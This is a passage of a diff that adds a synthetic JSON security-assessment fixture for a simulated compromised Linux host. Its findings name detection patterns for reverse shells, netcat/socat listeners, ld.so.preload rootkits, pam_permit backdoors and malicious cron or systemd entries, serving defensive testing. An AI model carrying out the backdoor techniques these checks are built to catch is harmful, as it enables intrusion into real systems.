@@ -1,0 +1,6489 @@
+{
+ "schema_version": "0.1.0",
+ "kind": "assessment",
+ "engine": {
+  "name": "blueops-engine",
+  "version": "0.4.0"
+ },
+ "assessment": {
+  "id": "fixture-linux-compromised",
+  "profile": "default",
+  "platform": "linux",
+  "started_at": "2026-03-01T10:00:00Z",
+  "finished_at": "2026-03-01T10:05:00Z",
+  "mode": "read-only",
+  "fail_on": "medium",
+  "status": "complete",
+  "exit_code": 4,
+  "modules": [
+   "linux.auth",
+   "linux.filesystem",
+   "linux.network",
+   "linux.pam",
+   "linux.persistence",
+   "linux.processes",
+   "linux.services",
+   "linux.sysconfig",
+   "linux.system",
+   "linux.users"
+  ]
+ },
+ "modules": [
+  {
+   "id": "linux.auth",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 4,
+   "exit_code": 0,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "auth",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.auth/output/blueops-run-20261102T014956Z-audit-linux/report.json",
+    "sha256": "ba0b6171803bd83650050e1c7bc4ae135091c7e4b91008a3d01a993ab367a389"
+   }
+  },
+  {
+   "id": "linux.filesystem",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 6,
+   "exit_code": 4,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "filesystem",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.filesystem/output/blueops-run-20261102T014957Z-audit-linux/report.json",
+    "sha256": "37ac28b5abe20013912bd48e2f1abe62b78e60a4504b61d309b60bbe5cfd0b6b"
+   }
+  },
+  {
+   "id": "linux.network",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 12,
+   "exit_code": 4,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "network",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.network/output/blueops-run-20261102T014958Z-audit-linux/report.json",
+    "sha256": "7106ea505b7ea7c97b536245f20a953d2ab1b0994739c2880997afa4fc341e05"
+   },
+   "errors": [
+    {
+     "code": "TOOL_MISSING",
+     "message": "ip/route not found; routes decoded from /proc/net/route",
+     "check_id": "NET-ROUTE-001"
+    },
+    {
+     "code": "TOOL_MISSING",
+     "message": "ip/ifconfig not found; interface names only (from /sys/class/net)",
+     "check_id": "NET-IFACE-001"
+    }
+   ]
+  },
+  {
+   "id": "linux.pam",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 7,
+   "exit_code": 4,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "pam",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.pam/output/blueops-run-20261102T014958Z-audit-linux/report.json",
+    "sha256": "166f6621ca8f8fa2c8948bfe6d6337979f9353fbe243b94b90b04f0c8c037fb5"
+   }
+  },
+  {
+   "id": "linux.persistence",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 8,
+   "exit_code": 4,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "persistence",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.persistence/output/blueops-run-20261102T014959Z-audit-linux/report.json",
+    "sha256": "d1893bc9c340be2aee91529ed973e37a64b0695d8a80d7e7f91cca904342eb8a"
+   }
+  },
+  {
+   "id": "linux.processes",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 5,
+   "exit_code": 4,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "processes",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.processes/output/blueops-run-20261102T014959Z-audit-linux/report.json",
+    "sha256": "a3f6bac5390fe5ad181a2e000e2bc50b1b44e803530e0f042c51d78ab2adb55e"
+   }
+  },
+  {
+   "id": "linux.services",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 5,
+   "exit_code": 4,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "services",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.services/output/blueops-run-20261102T015000Z-audit-linux/report.json",
+    "sha256": "0cf7477628d11af0a237ad30e832abd814b6214fd0ee8da1b08cc59cde4235ee"
+   }
+  },
+  {
+   "id": "linux.sysconfig",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 2,
+   "exit_code": 0,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "sysconfig",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.sysconfig/output/blueops-run-20261102T015000Z-audit-linux/report.json",
+    "sha256": "453e1f306fb1c819b042d9d412464340225e4841e623c475db240b6913d12ef2"
+   }
+  },
+  {
+   "id": "linux.system",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 2,
+   "exit_code": 0,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "system",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.system/output/blueops-run-20261102T015000Z-audit-linux/report.json",
+    "sha256": "90b5aa4589ed0182e8e876e3b28940d54f0f20ea43e1ff911a45fd0f15e4a470"
+   }
+  },
+  {
+   "id": "linux.users",
+   "status": "ok",
+   "started_at": "2026-03-01T10:00:00Z",
+   "finished_at": "2026-03-01T10:00:01Z",
+   "duration_seconds": 0.2,
+   "findings": 14,
+   "exit_code": 4,
+   "command": [
+    "audit-linux.sh",
+    "--modules",
+    "users",
+    "--json",
+    "--quiet"
+   ],
+   "report": {
+    "path": "modules/linux.users/output/blueops-run-20261102T015001Z-audit-linux/report.json",
+    "sha256": "98c764e3849ce1a025a775fe398bda910c4443fa662f92f44acd14f57fd870ec"
+   }
+  }
+ ],
+ "findings": [
+  {
+   "id": "BOF-6c5602dec75bf618",
+   "check_id": "USR-UID0-001",
+   "title": "Non-root account with UID 0",
+   "description": "Accounts other than 'root' have UID 0 and therefore full root privileges.",
+   "severity": "critical",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-0ddfdf1f81616380"
+   ],
+   "remediation": {
+    "summary": "Verify each account; if unauthorized, lock it (usermod -L) after capturing evidence.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1136.001",
+     "url": "https://attack.mitre.org/techniques/T1136/001/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-UID0-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-f90c6a305297a6cf",
+   "check_id": "FS-MODE-001",
+   "title": "Unsafe permissions on sensitive system files",
+   "description": "Sensitive files should not be writable by group/other (shadow files not readable by other either).",
+   "severity": "high",
+   "confidence": "high",
+   "category": "filesystem",
+   "component": "filesystem",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-3fa6bc1a6cd709b7",
+    "EV-2a793191d7eec6f9"
+   ],
+   "remediation": {
+    "summary": "Restore distribution defaults (e.g. chmod 0644 passwd/group, 0640 shadow, 0440 sudoers) after checking ownership.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1222.002",
+     "url": "https://attack.mitre.org/techniques/T1222/002/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-3",
+     "title": "Access Enforcement"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-MODE-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-1d4608a87d493a0d",
+   "check_id": "NET-ESTAB-002",
+   "title": "Shell or netcat process with an established connection",
+   "description": "An interactive shell or netcat/socat holding a network connection is characteristic of a reverse shell.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-a6b0c1ce2213a8b9"
+   ],
+   "remediation": {
+    "summary": "Identify the process tree and remote peer; preserve evidence before containment.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1059.004",
+     "url": "https://attack.mitre.org/techniques/T1059/004/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ESTAB-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-f09cfd76b30d1649",
+   "check_id": "NET-EXPOSE-001",
+   "title": "Cleartext or unauthenticated admin service reachable on the network",
+   "description": "Legacy services (ftp, telnet, tftp, r-services, Docker TCP API) listening on a non-loopback address.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-bc4759191fe80e11"
+   ],
+   "remediation": {
+    "summary": "If not required (check scored services first), disable the unit or bind to loopback.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1021",
+     "url": "https://attack.mitre.org/techniques/T1021/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-EXPOSE-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-35114096c24d8831",
+   "check_id": "NET-LISTEN-002",
+   "title": "Listener owned by a shell, netcat or script interpreter",
+   "description": "Generic interpreters listening on a socket are a common bind-shell/backdoor pattern.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-8bce1bc58e380163"
+   ],
+   "remediation": {
+    "summary": "Identify the owning process and its parent; preserve evidence before termination.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1059",
+     "url": "https://attack.mitre.org/techniques/T1059/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-LISTEN-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-9479348118f5354f",
+   "check_id": "PAM-MODULE-001",
+   "title": "PAM module loaded from outside the system module directories",
+   "description": "Absolute module paths outside the standard security directories are rare and are used to load credential-capturing modules.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "pam",
+   "component": "pam",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-b5fb406be36a4291"
+   ],
+   "remediation": {
+    "summary": "Hash and inspect the module before removing the rule.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1556.003",
+     "url": "https://attack.mitre.org/techniques/T1556/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-MODULE-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-b2ebe1ce03caffc8",
+   "check_id": "PAM-PERMIT-001",
+   "title": "PAM authentication can succeed without verifying a credential",
+   "description": "pam_permit in an auth stack as 'sufficient', or as the only authenticating module, lets any user log in. Debian/RHEL stacks use it only as a final required entry after real checks.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "pam",
+   "component": "pam",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-936772d2b9925dd0",
+    "EV-d796722dabb9c325",
+    "EV-0fd3e2489323a778",
+    "EV-92a326160928b1c8"
+   ],
+   "remediation": {
+    "summary": "Compare with the distribution default for this service; restore from the package (e.g. pam-auth-update) after preserving the file.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1556.003",
+     "url": "https://attack.mitre.org/techniques/T1556/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-PERMIT-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-2920494552eee11d",
+   "check_id": "PER-CRON-002",
+   "title": "Suspicious cron job",
+   "description": "Cron entries match reverse-shell, download-and-execute, world-writable-path or similar patterns.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-73c39801ab64b5df"
+   ],
+   "remediation": {
+    "summary": "Preserve the file, then remove or comment the entry after review.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1053.003",
+     "url": "https://attack.mitre.org/techniques/T1053/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-CRON-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-aa63c8f52d9ad044",
+   "check_id": "PER-LDPRE-001",
+   "title": "/etc/ld.so.preload is populated",
+   "description": "Libraries listed here are injected into every dynamically linked process; a standard userland rootkit technique.",
+   "severity": "high",
+   "confidence": "high",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-7564a17e83d56988"
+   ],
+   "remediation": {
+    "summary": "Inspect the listed libraries (hash them) before removal.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1574.006",
+     "url": "https://attack.mitre.org/techniques/T1574/006/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-LDPRE-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-548d6939e2c72d12",
+   "check_id": "PER-SHELL-001",
+   "title": "Suspicious shell startup content",
+   "description": "Profile/rc files run on login or shell start and match reverse-shell, alias-hijack, LD_PRELOAD or similar patterns.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-a19b6e0a46463c44"
+   ],
+   "remediation": {
+    "summary": "Preserve the file, then remove the offending lines after review.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1546.004",
+     "url": "https://attack.mitre.org/techniques/T1546/004/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-SHELL-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-ab493aa28e0292be",
+   "check_id": "PER-STARTUP-001",
+   "title": "Suspicious startup script",
+   "description": "Boot-time scripts match reverse-shell, download-and-execute, world-writable-path or similar patterns.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-96a21e6dbd3d52e3"
+   ],
+   "remediation": {
+    "summary": "Preserve the script, then remove the offending lines after review.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1037.004",
+     "url": "https://attack.mitre.org/techniques/T1037/004/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-STARTUP-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-5c2f60525cb7b79b",
+   "check_id": "PER-SYSTEMD-001",
+   "title": "Suspicious systemd unit commands",
+   "description": "Unit Exec/Environment lines match reverse-shell, download-and-execute, world-writable-path or similar patterns.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-55dedfaa73a740fc"
+   ],
+   "remediation": {
+    "summary": "Preserve the unit file, then disable it (systemctl disable --now) after confirming it is not a scored service.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1543.002",
+     "url": "https://attack.mitre.org/techniques/T1543/002/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-SYSTEMD-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-36efd405ece2509a",
+   "check_id": "PRC-CMD-001",
+   "title": "Suspicious command line",
+   "description": "Command line matches reverse-shell, download-and-execute or similar patterns.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "processes",
+   "component": "processes",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:59Z",
+   "evidence": [
+    "EV-adc89bc75279f22f"
+   ],
+   "remediation": {
+    "summary": "Review the process, its parent, and its network connections.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1059",
+     "url": "https://attack.mitre.org/techniques/T1059/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-4",
+     "title": "System Monitoring"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-CMD-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-d382806c7f769694",
+   "check_id": "PRC-DELETED-001",
+   "title": "Process running from a deleted or memory-backed executable",
+   "description": "The on-disk binary was removed (or runs from memfd) after launch - typical of fileless or cleaned-up malware, but also of package upgrades without restart.",
+   "severity": "high",
+   "confidence": "high",
+   "category": "processes",
+   "component": "processes",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:59Z",
+   "evidence": [
+    "EV-622a6e7f828e717a"
+   ],
+   "remediation": {
+    "summary": "Capture evidence (/proc/PID/exe copy, memory) before killing; compare with recent package updates.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1620",
+     "url": "https://attack.mitre.org/techniques/T1620/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-4",
+     "title": "System Monitoring"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-DELETED-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-f21e2c93b308d410",
+   "check_id": "PRC-MASQ-001",
+   "title": "Process mimics a kernel thread name",
+   "description": "Command line is bracketed like a kernel thread but the process has a user-space executable.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "processes",
+   "component": "processes",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:59Z",
+   "evidence": [
+    "EV-eb1089520fd75a19"
+   ],
+   "remediation": {
+    "summary": "Inspect the executable and parent process.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1036.004",
+     "url": "https://attack.mitre.org/techniques/T1036/004/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-4",
+     "title": "System Monitoring"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-MASQ-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-de661f4572206a4c",
+   "check_id": "USR-GROUP-003",
+   "title": "Accounts with an administrative primary group",
+   "description": "These accounts are not listed as group members in /etc/group but hold an administrative group (root, sudo, wheel, admin) as their primary group, which grants the same privileges.",
+   "severity": "high",
+   "confidence": "medium",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-0ddfdf1f81616380"
+   ],
+   "remediation": {
+    "summary": "Verify each account; change the primary group with usermod -g after preserving the passwd and group files.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1098",
+     "url": "https://attack.mitre.org/techniques/T1098/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-GROUP-003"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-dcedc6bf99da5b4a",
+   "check_id": "USR-PWD-001",
+   "title": "Login-capable account with empty password",
+   "description": "Accounts with an empty password field may authenticate without a password (subject to PAM/sshd config).",
+   "severity": "high",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-3fa6bc1a6cd709b7"
+   ],
+   "remediation": {
+    "summary": "Set a password or lock the account (passwd -l). Coordinate with scored-service credentials first.",
+    "priority": "P1"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1078.003",
+     "url": "https://attack.mitre.org/techniques/T1078/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-PWD-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-b2452c2e76385369",
+   "check_id": "FS-RECENT-001",
+   "title": "Executables modified in the last 3 day(s)",
+   "description": "Files in bin/sbin directories. Expected after package updates; otherwise a sign of trojanized binaries.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "filesystem",
+   "component": "filesystem",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-14452aca4417dc45",
+    "EV-2b4f9a2f60dff00b",
+    "EV-42399253813ea945"
+   ],
+   "remediation": {
+    "summary": "Verify against package manager checksums (debsums -c / rpm -Va).",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1554",
+     "url": "https://attack.mitre.org/techniques/T1554/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-3",
+     "title": "Access Enforcement"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-a99f2449a46a38b5",
+   "check_id": "NET-ESTAB-003",
+   "title": "Connection to a port commonly used by remote-access tooling",
+   "description": "Remote ports 4444, 4445, 1337, 31337 and 6667 are frequent in default listeners and IRC bots; may be benign.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-a6b0c1ce2213a8b9"
+   ],
+   "remediation": {
+    "summary": "Check the owning process and destination.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1571",
+     "url": "https://attack.mitre.org/techniques/T1571/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-ESTAB-003"
+    }
+   ],
+   "occurrences": 1
